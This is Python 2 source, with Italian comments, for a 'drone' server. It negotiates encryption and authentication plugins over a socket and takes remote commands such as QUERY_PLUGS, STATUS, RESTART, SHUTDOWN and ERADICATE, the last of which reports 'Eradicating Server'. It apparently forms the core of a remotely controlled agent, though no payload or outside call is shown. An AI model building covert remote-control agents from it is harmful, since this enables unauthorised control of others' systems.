# -*- coding: iso-8859-1 -*-
import re
import time
import common
#TODO: pdb
import pdb

droneV='v1.0 Squasher'
err_cnt=0

class DroneGeneric(Exception):
    def __init__(self):
        pass

class DroneFatal(DroneGeneric):
    def __init__(self,socket,message):
        DroneGeneric.__init__(self)
        socket.sendall("-FATAL: "+message+"\r\n")

def find_module_type(mod_type):
    res={}
    for j in range(0,len(common.plugins)):
        p=common.plugins[j]
        if (re.match('^'+mod_type+'_',p.__name__))!=None:
            res[p.__name__]=p
    return res
    
def check_command(string,depurate=False):
    if string.find("\r")==string.find("\n")-1: 
	    if depurate: return string.strip("\n").strip("\r")
	    else: return True
    else: return False

class Client:
    def __init__(self,socket,enc,auth):
        encs=find_module_type('enc')
        auths=find_module_type('auth')
        if len(encs)==0 or len(auths)==0: raise DroneFatal(socket,"Unable to Comunicate")
        try:
            self.wire=encs[enc].Encryption(socket)
            self.auth=auths[auth].Authentication(self.wire) # yet encrypted
        except KeyError:
            raise DroneFatal(socket,"Desidered Encryption or Authentication not Available")
    def send(self,data):
	    self.wire.send(data)
    def recv(self,l):
	    t=self.wire.recv(l)
	    if not t: raise DroneGeneric
	    return t
    def send_error(self,msg):
	    self.wire.send('-ERROR: '+msg+"\r\n")
    def send_ok(self,msg):
	    self.wire.send('+OK: '+msg+"\r\n")
    def send_warning(self,msg):
	    self.wire.send('*WARNING: '+msg+"\r\n")

def parse_command(cmd):
    # SINTASSI COMANDI:
    # $$ COMANDO... Indirizzato al drone genericamente
    # $nome_plugin COMANDO... indirizzato a particolare plugin
    # COMANDI DRONE:
    # $$ QUERY_PLUGS -> riporta nomi dei plugin caricati
    # $$ QUERY_STATUS -> riporta status ed informazioni del drone
    # SINTASSI PLUGINS:
    # $nome_plugin query_functions() -> ritorna funzioni del plugin, da decidere il formato
    # $nome_plugin funzione(arg1,arg2,arg3,arg4,arg5,...)
    #TODO: ERADICATE
    global err_cnt
    if len(cmd)<1: # TRASH
	return
    elif cmd[0]!='$': # NOT A COMMAND
	err_cnt+=1
	if err_cnt==3:
	    err_cnt=0
	    raise DroneGeneric
    elif cmd[1]=='$': # DRONE COMMAND
	if 'QUERY_PLUGS' in cmd:
	    resp=''
	    for j in range(0,len(common.plugins)):
		if '__SYSTEM' in dir(common.plugins[j]): resp+='*'
		resp+=common.plugins[j].__name__+'['+common.plugins[j].package+']'+','
	    C.send_ok(resp)
	elif 'STATUS' in cmd:
	    C.send_ok('Drone '+droneV+' Status OK at '+time.ctime(time.time()))
	# TODO AGGIUNGERE COMANDO INFO! HOSTNAME, IP ecc ecc
	elif 'EXIT' in cmd:
	    C.send_ok('Exiting')
	    raise DroneGeneric
	elif 'RESTART' in cmd:
	    C.send_ok('Restarting')
	    common.kill_myself=1
	    common.kill_restart=1
	    raise DroneGeneric
	elif 'SHUTDOWN' in cmd:
	    C.send_ok('Shutting Down')
	    common.kill_myself=1
	    common.kill_restart=0
	    raise DroneGeneric
	elif 'ERADICATE' in cmd:
	    C.send_ok('Eradicating Server')
	    common.kill_myself=1
	    common.kill_restart=2 # SPECIAL!!!
	else:
	    C.send_error('Unknown Command')
    else: # PLUGIN COMMAND
	extr=re.match('^\$([^ ]+) (.+)$',cmd)
	if not extr:
	    C.send_error('No Such Plugin')
	    return
	for j in range(0,len(common.plugins)):
	    if extr.group(1)==common.plugins[j].__name__: break
	else:
	    C.send_error('No Such Plugin')
	    return
	# Command not handled, in caso affermativo il plugin decide il formato della risposta (ecco perche' manca send_ok)
	if not common.plugins[j].handle_command(C,extr.group(2)):
	    C.send_error('Command not Handled')

# Non è stato inserita la creazione di Thread ogni volta che una funzione di un plugin viene lanciata
# o cada plugin viene caricato per lasciare totale libertà ai plugin stessi: quando effettueranno una
# operazione chiaramente pericolosa allora lancieranno un thread separato per i cazzi loro
def main(socket):
    socket.settimeout(300) # 5 minutes
    enc_auth=''
    while not check_command(enc_auth):
        tmp=socket.recv(16)
        if not tmp: raise DroneGeneric
        enc_auth+=tmp
    enc_auth=check_command(enc_auth,True)
    m=re.match("(.+)\|(.+)",enc_auth) # enc_null|auth_null
    global C
    C=Client(socket,m.group(1),m.group(2))
    # Client Class, available
    del m,enc_auth
    command=''
    while True:
	command+=C.recv(32)
	if check_command(command):
	    parse_command(check_command(command,True))
	    command=''
